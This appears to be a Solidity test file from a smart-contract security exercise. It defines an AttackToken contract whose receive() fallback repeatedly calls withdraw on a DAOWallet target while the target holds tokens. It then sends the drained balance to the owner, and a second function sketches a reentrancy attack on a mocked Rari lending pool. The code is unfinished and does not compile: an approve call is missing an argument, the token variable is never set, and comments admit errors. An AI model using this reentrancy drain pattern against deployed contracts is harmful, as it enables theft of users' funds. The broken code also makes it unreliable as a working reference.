// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import { DAOWallet } from "../DAOWallet.sol";
import { MockERC20 } from "../../mocks/MockERC20.sol";
import { MockRari } from "../attacks/rari/MockRari.sol";

contract AttackToken is Test {
    DAOWallet public target;
    address public owner;
    MockERC20 public token;
    address public tokenAddress;
    MockRari public mockRari;

    constructor (address payable _target, address _token, address _mockRari) payable {
        target = DAOWallet(_target);
        owner = msg.sender;
        tokenAddress = _token;
        mockRari = MockRari(_mockRari);
    }

    function attack(uint amount) external payable {
        target.deposit(tokenAddress, amount); // this is erroring
        target.withdraw(tokenAddress, amount);
    }

    /// @notice reentrancy logic here
    /// @dev Doesn't need to payable because we are using ERC20, not ETH for collateral
    function attackRari(uint amount, address tokenAddress) external {
        /// allowances
        token.approve(address(mockRari), );

        /// perform reentrancy call depositing ERC20 and pulling out ETH
        mockRari.borrow(amount, tokenAddress);
    }

    receive() external payable {
        emit log_string("in rari fallback");
        if (token.balanceOf(address(target)) > 0) {
            emit log_named_uint("attack contract balance", token.balanceOf(address(target)));
            target.withdraw(address(token), 60); // not sure how we specify the amount for hacking
        } else {
            console.log('victim account drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    function getContractTokenBalance() public view returns(uint) {
        return token.balanceOf(address(this));
    }
}